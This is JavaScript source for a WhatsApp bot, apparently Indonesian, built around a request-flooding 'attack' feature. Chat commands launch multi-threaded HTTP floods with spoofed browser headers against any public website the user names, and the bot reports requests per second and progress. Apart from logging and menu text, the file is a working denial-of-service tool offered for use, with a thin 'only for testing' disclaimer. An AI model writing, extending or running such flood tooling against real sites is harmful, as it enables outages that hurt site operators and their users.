import fs from 'fs-extra';
import axios from 'axios';
import chalk from 'chalk';

// Enhanced Logger dengan design premium
class Logger {
    constructor() {
        this.logFile = './logs/bot.log';
        this.ensureLogDirectory();
    }

    ensureLogDirectory() {
        try {
            fs.ensureDirSync('./logs');
        } catch (error) {
            console.error('❌ Error creating log directory:', error.message);
        }
    }

    log(level, message, data = null) {
        const timestamp = new Date().toLocaleTimeString('id-ID');
        const colors = {
            error: chalk.red.bold,
            warn: chalk.yellow.bold,
            info: chalk.blue.bold,
            success: chalk.green.bold,
            debug: chalk.gray,
            system: chalk.magenta.bold,
            admin: chalk.cyan.bold
        };

        const emoji = {
            error: '❌',
            warn: '⚠️',
            info: 'ℹ️',
            success: '✅',
            debug: '🔍',
            system: '⚙️',
            admin: '👑'
        };

        const logEntry = `${emoji[level]} ${colors[level](`[${timestamp}] ${message}`)}`;
        console.log(logEntry);

        if (data && Object.keys(data).length > 0) {
            console.log(chalk.gray('   ↳ Details:'), JSON.stringify(data, null, 2));
        }

        // Simpan ke file log
        try {
            const logData = {
                timestamp: new Date().toISOString(),
                level,
                message,
                data: data instanceof Error ? { message: data.message, stack: data.stack } : data
            };
            fs.appendFileSync(this.logFile, JSON.stringify(logData) + '\n');
        } catch (error) {
            console.log(chalk.red('❌ Error writing to log file:'), error.message);
        }
    }

    error(message, error = null) {
        this.log('error', message, error);
    }

    info(message, data = null) {
        this.log('info', message, data);
    }

    success(message, data = null) {
        this.log('success', message, data);
    }

    warn(message, data = null) {
        this.log('warn', message, data);
    }

    debug(message, data = null) {
        this.log('debug', message, data);
    }

    system(message, data = null) {
        this.log('system', message, data);
    }

    admin(message, data = null) {
        this.log('admin', message, data);
    }
}

const logger = new Logger();

// Enhanced Kelas Attack Manager Premium
class AttackManager {
    constructor() {
        this.attacks = new Map();
        this.requestCount = 0;
        this.isActive = true;
        this.totalSuccessful = 0;
        this.totalFailed = 0;
        logger.success('⚡ Attack Manager initialized successfully');
    }

    validateUrl(url) {
        try {
            if (!url || typeof url !== 'string') {
                throw new Error('Invalid URL format');
            }

            let processedUrl = url.trim();
            if (!processedUrl.startsWith('http')) {
                processedUrl = 'https://' + processedUrl;
            }
            
            const urlObj = new URL(processedUrl);
            
            // Block common local and private IPs
            const hostname = urlObj.hostname;
            if (hostname === 'localhost' || 
                hostname === '127.0.0.1' || 
                hostname === '0.0.0.0' ||
                hostname.startsWith('192.168.') ||
                hostname.startsWith('10.') ||
                hostname.startsWith('172.') && 
                parseInt(hostname.split('.')[1]) >= 16 && 
                parseInt(hostname.split('.')[1]) <= 31) {
                throw new Error('Local/private IP addresses are not allowed');
            }
            
            return true;
        } catch (error) {
            logger.warn('URL validation failed', { url, error: error.message });
            return false;
        }
    }

    async makeRequest(url, method = 'GET', timeout = 8000) {
        if (!this.validateUrl(url)) {
            return { 
                success: false, 
                error: 'Invalid URL format or local IP detected'
            };
        }

        let targetUrl = url;
        if (!targetUrl.startsWith('http')) {
            targetUrl = 'https://' + targetUrl;
        }

        try {
            const startTime = Date.now();
            const response = await axios({
                method: method.toLowerCase(),
                url: targetUrl,
                timeout: timeout,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                },
                validateStatus: () => true,
                decompress: true
            });
            
            const endTime = Date.now();
            const responseTime = endTime - startTime;

            this.requestCount++;

            return {
                success: true,
                status: response.status,
                responseTime: responseTime,
                headers: response.headers,
                dataLength: response.data ? response.data.length : 0
            };
        } catch (error) {
            this.requestCount++;
            
            return {
                success: false,
                error: error.message,
                code: error.code,
                isTimeout: error.code === 'ECONNABORTED',
                details: 'Network error or timeout'
            };
        }
    }

    async startAttack(targetUrl, durationMs, threads = 5, method = 'GET') {
        try {
            if (!this.validateUrl(targetUrl)) {
                throw new Error('Invalid URL format or local IP detected');
            }

            const attackId = Date.now().toString() + Math.random().toString(36).substr(2, 5);
            logger.info(`🚀 Starting attack campaign`, { 
                attackId, 
                target: targetUrl, 
                duration: `${durationMs / 1000}s`,
                threads,
                method
            });

            const attackInfo = {
                target: targetUrl,
                method: method,
                startTime: Date.now(),
                endTime: Date.now() + durationMs,
                requests: 0,
                successful: 0,
                failed: 0,
                active: true,
                threads: threads,
                lastUpdate: Date.now(),
                workerStats: Array(threads).fill().map(() => ({ requests: 0, successful: 0, failed: 0 }))
            };

            this.attacks.set(attackId, attackInfo);

            const makeRequests = async (workerId) => {
                while (this.isActive && attackInfo.active && Date.now() < attackInfo.endTime) {
                    try {
                        const result = await this.makeRequest(targetUrl, method);
                        attackInfo.requests++;
                        attackInfo.workerStats[workerId].requests++;
                        
                        if (result.success) {
                            attackInfo.successful++;
                            attackInfo.workerStats[workerId].successful++;
                            this.totalSuccessful++;
                        } else {
                            attackInfo.failed++;
                            attackInfo.workerStats[workerId].failed++;
                            this.totalFailed++;
                        }
                        
                        // Update progress every 50 requests or 5 seconds
                        const now = Date.now();
                        if (now - attackInfo.lastUpdate > 5000 || attackInfo.requests % 50 === 0) {
                            attackInfo.lastUpdate = now;
                            const elapsed = (now - attackInfo.startTime) / 1000;
                            const rps = (attackInfo.requests / elapsed).toFixed(2);
                            logger.debug(`📊 Attack progress`, { 
                                attackId, 
                                requests: attackInfo.requests,
                                rps,
                                successRate: ((attackInfo.successful / attackInfo.requests) * 100).toFixed(2) + '%'
                            });
                        }
                        
                        // Small delay to avoid overwhelming the system
                        await new Promise(resolve => setTimeout(resolve, Math.random() * 100 + 20));
                    } catch (error) {
                        attackInfo.failed++;
                        attackInfo.workerStats[workerId].failed++;
                        this.totalFailed++;
                    }
                }
            };

            const promises = [];
            for (let i = 0; i < threads; i++) {
                promises.push(makeRequests(i));
            }

            Promise.all(promises).then(() => {
                if (attackInfo.active) {
                    attackInfo.active = false;
                    const totalTime = (Date.now() - attackInfo.startTime) / 1000;

                    const result = {
                        attackId: attackId,
                        target: targetUrl,
                        totalRequests: attackInfo.requests,
                        successful: attackInfo.successful,
                        failed: attackInfo.failed,
                        duration: totalTime.toFixed(2),
                        rps: (attackInfo.requests / totalTime).toFixed(2),
                        successRate: attackInfo.requests > 0 ? 
                            ((attackInfo.successful / attackInfo.requests) * 100).toFixed(2) : '0.00',
                        method: method,
                        threads: threads
                    };

                    logger.success(`🎯 Attack completed successfully`, result);
                    this.attacks.delete(attackId);
                }
            }).catch(error => {
                logger.error(`💥 Attack failed`, { attackId, error: error.message });
                attackInfo.active = false;
                this.attacks.delete(attackId);
            });

            return attackId;

        } catch (error) {
            logger.error('❌ Failed to start attack campaign', error);
            throw error;
        }
    }

    getActiveAttacks() {
        const activeAttacks = [];
        for (const [id, attack] of this.attacks) {
            if (attack.active) {
                const now = Date.now();
                const elapsed = Math.floor((now - attack.startTime) / 1000);
                const remaining = Math.max(0, Math.floor((attack.endTime - now) / 1000));
                const progress = ((now - attack.startTime) / (attack.endTime - attack.startTime) * 100).toFixed(1);
                
                activeAttacks.push({
                    id,
                    target: attack.target,
                    elapsed,
                    remaining,
                    progress,
                    requests: attack.requests,
                    successful: attack.successful,
                    failed: attack.failed,
                    threads: attack.threads,
                    method: attack.method,
                    rps: attack.requests > 0 ? (attack.requests / elapsed).toFixed(2) : '0.00'
                });
            }
        }
        return activeAttacks;
    }

    stopAttack(attackId) {
        const attack = this.attacks.get(attackId);
        if (attack && attack.active) {
            attack.active = false;
            logger.info(`🛑 Attack stopped`, { attackId });
            return true;
        }
        return false;
    }

    stopAllAttacks() {
        let stopped = 0;
        for (const [id, attack] of this.attacks) {
            if (attack.active) {
                attack.active = false;
                stopped++;
                logger.info(`🛑 Attack stopped`, { attackId: id });
            }
        }
        logger.success(`✅ All attacks terminated`, { stopped });
        return stopped;
    }

    getStats() {
        const activeAttacks = this.getActiveAttacks();
        return {
            totalRequests: this.requestCount,
            totalSuccessful: this.totalSuccessful,
            totalFailed: this.totalFailed,
            activeAttacks: activeAttacks.length,
            allAttacks: Array.from(this.attacks.values())
        };
    }

    cleanup() {
        this.isActive = false;
        this.stopAllAttacks();
        logger.info('🧹 Attack manager cleaned up');
    }
}

// Enhanced Command Handler Premium dengan Admin Control
class CommandHandler {
    constructor(sock, config) {
        this.sock = sock;
        this.config = config;
        this.attackManager = new AttackManager();
        this.commands = new Map();
        this.userCooldowns = new Map();
        this.setupCommands();
        logger.success('🎛️ Command Handler initialized successfully');
    }

    isAdmin(sender) {
        const senderNumber = sender.split('@')[0];
        return senderNumber === this.config.adminNumber;
    }

    isSelfMode() {
        return this.config.selfMode === true;
    }

    canUseCommand(sender, commandName) {
        // Command yang bisa digunakan semua orang
        const publicCommands = ['menu', 'info'];
        
        if (publicCommands.includes(commandName)) {
            return true;
        }

        // Jika self mode aktif, hanya admin yang bisa menggunakan command lainnya
        if (this.isSelfMode()) {
            return this.isAdmin(sender);
        }

        // Jika self mode tidak aktif, semua orang bisa menggunakan command
        return true;
    }

    setupCommands() {
        // Command .menu (Public)
        this.commands.set('menu', {
            description: 'Menampilkan menu bot premium',
            usage: '.menu',
            handler: async (message, args, sender) => {
                try {
                    const menuText = this.createMenuText();
                    await this.sendMessage(sender, menuText);
                    logger.success('📋 Menu displayed successfully', { sender: sender.split('@')[0] });
                } catch (error) {
                    logger.error('❌ Error displaying menu', error);
                    await this.sendMessage(sender, '❌ Error menampilkan menu');
                }
            }
        });

        // Command .info (Public)
        this.commands.set('info', {
            description: 'Informasi tentang bot',
            usage: '.info',
            handler: async (message, args, sender) => {
                try {
                    const infoText = this.createInfoText();
                    await this.sendMessage(sender, infoText);
                    logger.success('ℹ️ Info displayed', { sender: sender.split('@')[0] });
                } catch (error) {
                    logger.error('❌ Info command failed', error);
                    await this.sendMessage(sender, '❌ Error menampilkan info');
                }
            }
        });

        // Command .self (Admin Only)
        this.commands.set('self', {
            description: 'Mengatur mode self (hanya admin)',
            usage: '.self <on/off>',
            handler: async (message, args, sender) => {
                try {
                    if (!this.isAdmin(sender)) {
                        await this.sendMessage(sender, '❌ Command ini hanya untuk admin!');
                        return;
                    }

                    if (args.length === 0) {
                        await this.sendMessage(sender, 
                            `🔧 *SELF MODE STATUS*\nStatus: ${this.isSelfMode() ? 'ON 🟢' : 'OFF 🔴'}\n\nUsage: .self <on/off>`
                        );
                        return;
                    }

                    const mode = args[0].toLowerCase();
                    if (mode === 'on') {
                        this.config.selfMode = true;
                        await this.sendMessage(sender, '✅ *SELF MODE ON*\nSekarang hanya admin yang bisa menggunakan bot');
                        logger.admin('Self mode activated');
                    } else if (mode === 'off') {
                        this.config.selfMode = false;
                        await this.sendMessage(sender, '✅ *SELF MODE OFF*\nSekarang semua orang bisa menggunakan bot');
                        logger.admin('Self mode deactivated');
                    } else {
                        await this.sendMessage(sender, '❌ Mode tidak valid! Gunakan: .self <on/off>');
                        return;
                    }

                    // Save config
                    fs.writeJsonSync('./config.json', this.config, { spaces: 2 });

                } catch (error) {
                    logger.error('❌ Self command failed', error);
                    await this.sendMessage(sender, '❌ Error mengatur self mode');
                }
            }
        });

        // Command .attack (Admin Only in Self Mode)
        this.commands.set('attack', {
            description: 'Melakukan attack ke target website',
            usage: '.attack <url> <duration_in_seconds> <threads> <method>',
            handler: async (message, args, sender) => {
                try {
                    if (!this.canUseCommand(sender, 'attack')) {
                        await this.sendMessage(sender, this.createAdminOnlyMessage());
                        return;
                    }

                    // Cooldown check
                    const now = Date.now();
                    const lastAttack = this.userCooldowns.get(sender) || 0;
                    const cooldown = 30000; // 30 seconds cooldown
                    
                    if (now - lastAttack < cooldown) {
                        const remaining = Math.ceil((cooldown - (now - lastAttack)) / 1000);
                        await this.sendMessage(sender, `⏳ Mohon tunggu ${remaining} detik sebelum menggunakan attack lagi.`);
                        return;
                    }

                    if (args.length < 2) {
                        const helpText = this.createAttackHelpText();
                        await this.sendMessage(sender, helpText);
                        return;
                    }

                    let url = args[0];
                    const duration = parseInt(args[1]) * 1000;
                    const threads = args[2] ? parseInt(args[2]) : 5;
                    const method = args[3] || 'GET';

                    // Validasi
                    if (isNaN(duration) || duration <= 0) {
                        await this.sendMessage(sender, '❌ Durasi harus angka positif!');
                        return;
                    }

                    if (duration > 600000) { // 10 minutes max
                        await this.sendMessage(sender, '❌ Durasi maksimal 600 detik (10 menit)!');
                        return;
                    }

                    if (threads < 1 || threads > 20 || isNaN(threads)) {
                        await this.sendMessage(sender, '❌ Threads harus 1-20!');
                        return;
                    }

                    if (!['GET', 'POST', 'HEAD'].includes(method.toUpperCase())) {
                        await this.sendMessage(sender, '❌ Method harus GET, POST, atau HEAD!');
                        return;
                    }

                    const attackMessage = this.createAttackStartMessage(url, args[1], threads, method);
                    await this.sendMessage(sender, attackMessage);

                    // Set cooldown
                    this.userCooldowns.set(sender, now);

                    // Start attack
                    const attackId = await this.attackManager.startAttack(url, duration, threads, method.toUpperCase());
                    
                    // Progress updates
                    const progressInterval = setInterval(async () => {
                        const activeAttacks = this.attackManager.getActiveAttacks();
                        const currentAttack = activeAttacks.find(a => a.id === attackId);
                        
                        if (!currentAttack) {
                            clearInterval(progressInterval);
                            return;
                        }
                        
                        if (currentAttack.requests % 100 === 0 || currentAttack.remaining < 10) {
                            const progressText = this.createProgressText(currentAttack);
                            await this.sendMessage(sender, progressText);
                        }
                    }, 5000);

                    // Final report
                    setTimeout(async () => {
                        clearInterval(progressInterval);
                        const stats = this.attackManager.getStats();
                        const attack = stats.allAttacks.find(a => a.id === attackId);
                        
                        if (attack) {
                            const finalText = this.createFinalReport(attack);
                            await this.sendMessage(sender, finalText);
                        }
                    }, duration + 2000);

                    logger.success(`⚡ Attack started`, { 
                        attackId, 
                        url, 
                        duration, 
                        threads, 
                        method,
                        sender: sender.split('@')[0],
                        isAdmin: this.isAdmin(sender)
                    });

                } catch (error) {
                    logger.error('💥 Attack command failed', error);
                    const errorText = this.createErrorText(error);
                    await this.sendMessage(sender, errorText);
                }
            }
        });

        // Command .stopattack (Admin Only in Self Mode)
        this.commands.set('stopattack', {
            description: 'Menghentikan semua attack yang berjalan',
            usage: '.stopattack',
            handler: async (message, args, sender) => {
                try {
                    if (!this.canUseCommand(sender, 'stopattack')) {
                        await this.sendMessage(sender, this.createAdminOnlyMessage());
                        return;
                    }

                    const stopped = this.attackManager.stopAllAttacks();
                    const stopText = this.createStopText(stopped);
                    await this.sendMessage(sender, stopText);
                    logger.success('🛑 All attacks stopped', { 
                        sender: sender.split('@')[0],
                        isAdmin: this.isAdmin(sender)
                    });
                } catch (error) {
                    logger.error('❌ Stop attack failed', error);
                    await this.sendMessage(sender, '❌ Error menghentikan attack');
                }
            }
        });

        // Command .stats (Admin Only in Self Mode)
        this.commands.set('stats', {
            description: 'Menampilkan statistik attack',
            usage: '.stats',
            handler: async (message, args, sender) => {
                try {
                    if (!this.canUseCommand(sender, 'stats')) {
                        await this.sendMessage(sender, this.createAdminOnlyMessage());
                        return;
                    }

                    const stats = this.attackManager.getStats();
                    const statsText = this.createStatsText(stats);
                    await this.sendMessage(sender, statsText);
                    logger.success('📊 Stats displayed', { 
                        sender: sender.split('@')[0],
                        isAdmin: this.isAdmin(sender)
                    });
                } catch (error) {
                    logger.error('❌ Stats command failed', error);
                    await this.sendMessage(sender, '❌ Error menampilkan statistik');
                }
            }
        });

        // Command .idgc (Group Only)
        this.commands.set('idgc', {
            description: 'Mendapatkan ID grup',
            usage: '.idgc',
            handler: async (message, args, sender) => {
                try {
                    const isGroup = sender.endsWith('@g.us');
                    if (!isGroup) {
                        await this.sendMessage(sender, '❌ Command ini hanya bisa digunakan di dalam grup!');
                        return;
                    }

                    const groupId = sender;
                    const groupInfo = await this.sock.groupMetadata(sender);
                    
                    const idgcText = `
╭───📋 *GROUP INFORMATION* ───
│
│ 🏷️ *GROUP NAME:* ${groupInfo.subject}
│ 🔢 *GROUP ID:* ${groupId}
│ 👥 *PARTICIPANTS:* ${groupInfo.participants.length} members
│ 👑 *CREATED BY:* ${groupInfo.owner || 'Unknown'}
│ 📅 *CREATED AT:* ${new Date(groupInfo.creation * 1000).toLocaleDateString('id-ID')}
│
│ 💡 *TIP:* Gunakan ID ini untuk keperluan administrasi
│
╰─────────────────────────────⪨
                    `.trim();

                    await this.sendMessage(sender, idgcText);
                    logger.success('📋 Group ID displayed', { 
                        group: groupInfo.subject,
                        sender: sender.split('@')[0] 
                    });

                } catch (error) {
                    logger.error('❌ IDGC command failed', error);
                    await this.sendMessage(sender, '❌ Error mendapatkan informasi grup');
                }
            }
        });
    }

    createAdminOnlyMessage() {
        return `
╭───⛔ *ADMIN ONLY* ⛔───
│
│ ❌ Command ini hanya untuk admin!
│ 🔧 Self mode: ${this.isSelfMode() ? 'ON' : 'OFF'}
│
│ 📞 Hubungi admin bot untuk akses:
│ 👑 Admin: ${this.config.adminNumber}
│
│ ℹ️ Gunakan .info untuk informasi lebih lanjut
│
╰───────────────────────⪨
        `.trim();
    }

    createMenuText() {
        const selfModeStatus = this.isSelfMode() ? 'ON 🟢' : 'OFF 🔴';
        
        return `
╭───✨ *PREMIUM BOT v4.0* ✨───
│
│ 🔧 *AVAILABLE COMMANDS:*
│ ◈ .menu - Tampilkan menu ini
│ ◈ .info - Informasi bot
│ ◈ .idgc - Dapatkan ID grup (hanya di grup)
│
│ ⚡ *ADMIN COMMANDS:*
│ ◈ .attack <url> <detik> <threads> <method>
│ ◈ .stopattack - Hentikan semua attack
│ ◈ .stats - Lihat statistik attack
│ ◈ .self <on/off> - Atur mode self
│
│ 🔒 *SELF MODE:* ${selfModeStatus}
│ ${this.isSelfMode() ? '│ ◈ Hanya admin yang bisa menggunakan bot' : '│ ◈ Semua orang bisa menggunakan bot'}
│
│ ⚡ *FEATURES:*
│ ◈ Multi-thread requests (1-20 threads)
│ ◈ Multiple methods (GET, POST, HEAD)
│ ◈ Real-time monitoring
│ ◈ Admin control system
│ ◈ Group management
│
╰─────────────────────────────⪨
        `.trim();
    }

    createAttackHelpText() {
        return `
╭───❌ *FORMAT SALAH* ❌───
│
│ 📋 *PENGGUNAAN YANG BENAR:*
│ ◈ .attack <url> <detik> <threads> <method>
│
│ 🎯 *CONTOH:*
│ ◈ .attack example.com 60 10 GET
│ ◈ .attack https://site.com 30 5 POST
│ ◈ .attack target.com 120 15 HEAD
│
│ ⚙️ *PARAMETER:*
│ ◈ URL: website target
│ ◈ Detik: durasi (1-600)
│ ◈ Threads: request bersamaan (1-20)
│ ◈ Method: GET/POST/HEAD (default: GET)
│
╰─────────────────────────⪨
        `.trim();
    }

    createAttackStartMessage(url, duration, threads, method) {
        return `
╭───⚡ *ATTACK DIMULAI* ⚡───
│
│ 🎯 *TARGET:* ${url}
│ ⏱️ *DURASI:* ${duration} detik
│ 🔢 *THREADS:* ${threads}
│ 📡 *METHOD:* ${method}
│ 🚀 *STATUS:* Initializing...
│
│ ⏳ Mohon tunggu, attack sedang dipersiapkan...
│ 📊 Progress akan dikirim setiap 5 detik
│
╰─────────────────────────⪨
        `.trim();
    }

    createProgressText(attack) {
        const successRate = attack.requests > 0 
            ? ((attack.successful / attack.requests) * 100).toFixed(2) 
            : '0.00';

        return `
╭───📊 *PROGRESS ATTACK* 📊───
│
│ 🎯 *TARGET:* ${attack.target}
│ 📡 *REQUESTS:* ${attack.requests.toLocaleString()}
│ ✅ *SUCCESS:* ${attack.successful.toLocaleString()}
│ ❌ *FAILED:* ${attack.failed.toLocaleString()}
│ 📈 *SUCCESS RATE:* ${successRate}%
│ ⚡ *RPS:* ${attack.rps}
│ ⏱️ *ELAPSED:* ${attack.elapsed}s
│ ⏳ *REMAINING:* ${attack.remaining}s
│ 📊 *PROGRESS:* ${attack.progress}%
│ 🔢 *THREADS:* ${attack.threads}
│ 📡 *METHOD:* ${attack.method}
│
│ 🚀 Attack sedang berjalan...
│
╰──────────────────────────⪨
        `.trim();
    }

    createFinalReport(attack) {
        const totalTime = (attack.endTime - attack.startTime) / 1000;
        const successRate = attack.requests > 0 
            ? ((attack.successful / attack.requests) * 100).toFixed(2) 
            : '0.00';

        return `
╭───🎯 *ATTACK SELESAI* 🎯───
│
│ 🎯 *TARGET:* ${attack.target}
│ ⏱️ *DURASI:* ${totalTime.toFixed(2)} detik
│ 📡 *TOTAL REQUESTS:* ${attack.requests.toLocaleString()}
│ ✅ *SUCCESS:* ${attack.successful.toLocaleString()}
│ ❌ *FAILED:* ${attack.failed.toLocaleString()}
│ 📈 *SUCCESS RATE:* ${successRate}%
│ ⚡ *RPS:* ${(attack.requests / totalTime).toFixed(2)}
│ 🔢 *THREADS:* ${attack.threads}
│ 📡 *METHOD:* ${attack.method}
│
│ 🎉 Attack campaign selesai!
│ 🔄 Gunakan .attack untuk mulai lagi
│
╰──────────────────────────⪨
        `.trim();
    }

    createStopText(stopped) {
        const stats = this.attackManager.getStats();
        return `
╭───🛑 *ATTACK DIHENTIKAN* 🛑───
│
│ ✅ *DIHENTIKAN:* ${stopped} attack
│ 📊 *TOTAL REQUESTS:* ${stats.totalRequests.toLocaleString()}
│ ✅ *TOTAL SUCCESS:* ${stats.totalSuccessful.toLocaleString()}
│ ❌ *TOTAL FAILED:* ${stats.totalFailed.toLocaleString()}
│ 🎯 *STATUS:* Semua operasi dihentikan
│
│ 🔄 Gunakan .attack untuk mulai baru
│ 📊 Gunakan .stats untuk lihat statistik
│
╰─────────────────────────────⪨
        `.trim();
    }

    createStatsText(stats) {
        return `
╭───📈 *STATISTIK ATTACK* 📈───
│
│ 📊 *TOTAL REQUESTS:* ${stats.totalRequests.toLocaleString()}
│ ✅ *TOTAL SUCCESS:* ${stats.totalSuccessful.toLocaleString()}
│ ❌ *TOTAL FAILED:* ${stats.totalFailed.toLocaleString()}
│ ⚡ *SUCCESS RATE:* ${stats.totalRequests > 0 
        ? ((stats.totalSuccessful / stats.totalRequests) * 100).toFixed(2) 
        : '0.00'}%
│ 🎯 *ACTIVE ATTACKS:* ${stats.activeAttacks}
│
│ 📋 *HISTORY ATTACK:*
${stats.allAttacks.length > 0 ? stats.allAttacks.map((attack, index) => 
    `│ ◈ ${index + 1}. ${attack.target} (${attack.requests} requests)`).join('\n') 
    : '│ ◈ Tidak ada history attack'}
│
╰─────────────────────────────⪨
        `.trim();
    }

    createInfoText() {
        const selfModeStatus = this.isSelfMode() ? 'ON 🟢' : 'OFF 🔴';
        
        return `
╭───ℹ️ *INFORMASI BOT* ℹ️───
│
│ 🚀 *PREMIUM BOT v4.0*
│ ⭐ *Enhanced with Admin Control*
│ 📅 *Dibuat:* 2024
│ 👨‍💻 *Developer:* Premium Team
│
│ 🔒 *SELF MODE:* ${selfModeStatus}
│ 👑 *ADMIN:* ${this.config.adminNumber}
│
│ ⚡ *FITUR:*
│ ◈ Multi-thread technology
│ ◈ Real-time monitoring
│ ◈ Admin control system
│ ◈ Group management
│ ◈ Beautiful UI/UX
│
│ 📞 *SUPPORT:*
│ ◈ Gunakan .menu untuk bantuan
│ ◈ Laporkan bug ke developer
│
│ ⚠️ *PERINGATAN:*
│ ◈ Gunakan dengan bijak
│ ◈ Hanya untuk testing
│ ◈ Patuhi hukum setempat
│
╰─────────────────────────⪨
        `.trim();
    }

    createErrorText(error) {
        return `
╭───💥 *ERROR COMMAND* 💥───
│
│ ❌ *ERROR:* ${error.message}
│ 🔧 *TROUBLESHOOTING:*
│ ◈ Periksa format URL
│ ◈ Pastikan koneksi internet
│ ◈ Coba target yang berbeda
│ ◈ Gunakan parameter yang valid
│
│ 🆘 *BANTUAN:*
│ ◈ Gunakan .menu untuk help
│ ◈ Gunakan .info untuk informasi
│
╰─────────────────────────⪨
        `.trim();
    }

    async handleCommand(message) {
        try {
            let text = '';
            const msg = message.message;
            
            if (msg.conversation) {
                text = msg.conversation;
            } else if (msg.extendedTextMessage && msg.extendedTextMessage.text) {
                text = msg.extendedTextMessage.text;
            } else if (msg.imageMessage || msg.videoMessage) {
                // Skip media messages
                return false;
            }
            
            if (!text || !text.startsWith('.')) {
                return false;
            }

            const args = text.slice(1).trim().split(/ +/);
            const commandName = args.shift().toLowerCase();
            const sender = message.key.remoteJid;

            logger.info(`📩 Command received: .${commandName}`, { 
                sender: sender.split('@')[0],
                args: args.join(' '),
                isAdmin: this.isAdmin(sender),
                selfMode: this.isSelfMode()
            });

            if (this.commands.has(commandName)) {
                try {
                    const command = this.commands.get(commandName);
                    await command.handler(message, args, sender);
                    logger.success(`👍 Command executed: .${commandName}`, { 
                        sender: sender.split('@')[0],
                        isAdmin: this.isAdmin(sender)
                    });
                    return true;
                } catch (error) {
                    logger.error(`❌ Command execution failed: .${commandName}`, error);
                    await this.sendMessage(sender, 
                        `❌ *EXECUTION ERROR*\nCommand: .${commandName}\nError: ${error.message}`
                    );
                    return true;
                }
            }

            await this.sendMessage(sender, 
                `❌ *UNKNOWN COMMAND*\nCommand: .${commandName}\nUse .menu for available commands`
            );
            return true;

        } catch (error) {
            logger.error('💥 Command handling failed', error);
            return false;
        }
    }

    async sendMessage(jid, text, log = true) {
        try {
            await this.sock.sendMessage(jid, { text: text.trim() });
            if (log) {
                logger.debug('📤 Message sent', { 
                    to: jid.split('@')[0], 
                    length: text.length 
                });
            }
            return true;
        } catch (error) {
            logger.error('❌ Message sending failed', { 
                to: jid.split('@')[0], 
                error: error.message 
            });
            return false;
        }
    }

    stopAllAttacks() {
        try {
            this.attackManager.stopAllAttacks();
        } catch (error) {
            logger.error('❌ Error stopping attacks', error);
        }
    }

    cleanup() {
        try {
            this.attackManager.cleanup();
            logger.info('🧹 Command handler cleaned up');
        } catch (error) {
            logger.error('❌ Cleanup failed', error);
        }
    }
}

export default CommandHandler;